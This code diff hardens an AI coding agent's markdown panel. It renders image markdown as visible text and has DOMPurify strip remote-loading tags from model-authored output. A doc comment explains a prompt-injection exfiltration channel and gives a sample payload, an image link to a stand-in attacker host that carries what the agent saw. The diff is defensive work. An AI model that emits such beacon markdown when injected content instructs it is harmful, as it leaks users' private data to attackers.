@@ -152,7 +152,42 @@ const createMarkdownRenderer = (options?: MarkdownRenderOptions): MarkdownIt => 
   };
 
   fileReferencePlugin(md, options?.resolveFileHref);
+  disableRemoteImages(md);
   return md;
+};
+
+/**
+ * Replace markdown-it's `image` renderer so `![alt](url)` becomes visible text
+ * instead of an element that fetches `url` on render.
+ *
+ * This is the primary control for the exfiltration channel described on
+ * REMOTE_CONTENT_TAGS; the sanitizer's FORBID_TAGS is defense in depth behind
+ * it. Two reasons it belongs here rather than only at the sanitizer:
+ *
+ *  - It is a pure string transform with no DOM in the loop, so it behaves
+ *    identically in Node, happy-dom, and the webview's Chromium, and can be
+ *    tested without any of them.
+ *  - Sanitizer-level tag removal depends on the host DOM's tree traversal
+ *    being faithful. Ours is not, in at least one environment: under
+ *    happy-dom 19, `DOMPurify.sanitize(html, {FORBID_TAGS:['img']})` drops only
+ *    the FIRST matching element and leaves later siblings in place. That is
+ *    very likely a happy-dom traversal bug rather than a DOMPurify or Chromium
+ *    one — but "probably fine in the real browser" is not a foundation to put
+ *    an exfiltration control on, so the control does not depend on it.
+ *
+ * Rendering the URL as text keeps the attempt reviewable. A silently deleted
+ * beacon looks the same as no beacon.
+ */
+export const disableRemoteImages = (md: MarkdownIt): void => {
+  md.renderer.rules.image = (tokens, idx): string => {
+    const token = tokens[idx];
+    const src = token.attrGet?.('src') ?? '';
+    const alt = typeof token.content === 'string' ? token.content : '';
+    const label = alt ? `${alt}: ${src}` : src;
+    return `<span class="bandit-blocked-image" title="Image not loaded">`
+      + `[image] ${md.utils.escapeHtml(label)}`
+      + `</span>`;
+  };
 };
 
 export const renderMarkdownToHtml = (
@@ -162,6 +197,39 @@ export const renderMarkdownToHtml = (
   const md = createMarkdownRenderer(options);
   return md.render(content);
 };
+
+/**
+ * Tags that fetch a remote resource on render, stripped from any markdown the
+ * MODEL produced.
+ *
+ * An `<img>` in assistant markdown is a silent outbound GET the moment it
+ * paints — no click, no prompt, no permission card. That turns any prompt
+ * injection into an exfiltration channel: content the agent just read (a repo
+ * file, a fetched page, an MCP response) instructs it to emit
+ * `![](https://attacker/?d=<what it saw>)`, and the panel leaks it on render.
+ * The host CSP has to allow `img-src https:` for legitimate product imagery,
+ * so the block belongs at the sanitizer.
+ *
+ * Images are close to worthless in a coding-agent transcript, so the trade is
+ * lopsided — and the URL still renders as visible text, which is strictly more
+ * reviewable than a hidden 1x1 request.
+ *
+ * Apply to model-authored markdown ONLY. Trusted first-party content (an
+ * extension README, product chrome) renders through its own path and keeps
+ * images. User-attached images are React elements, not markdown, and are
+ * unaffected.
+ */
+export const REMOTE_CONTENT_TAGS = [
+  "img",
+  "picture",
+  "source",
+  "video",
+  "audio",
+  "iframe",
+  "object",
+  "embed",
+  "link"
+];
 
 export const MarkdownMessage = ({
   content,
@@ -175,7 +243,10 @@ export const MarkdownMessage = ({
     const rendered = renderHtml
       ? renderHtml(sanitizedContent)
       : renderMarkdownToHtml(sanitizedContent, { resolveFileHref });
-    return DOMPurify.sanitize(rendered, { ADD_ATTR: ["data-file-ref", "target", "rel"] });
+    return DOMPurify.sanitize(rendered, {
+      ADD_ATTR: ["data-file-ref", "target", "rel"],
+      FORBID_TAGS: REMOTE_CONTENT_TAGS
+    });
   }, [renderHtml, resolveFileHref, sanitizedContent]);
 
   // Morph the new HTML into the existing DOM instead of replacing
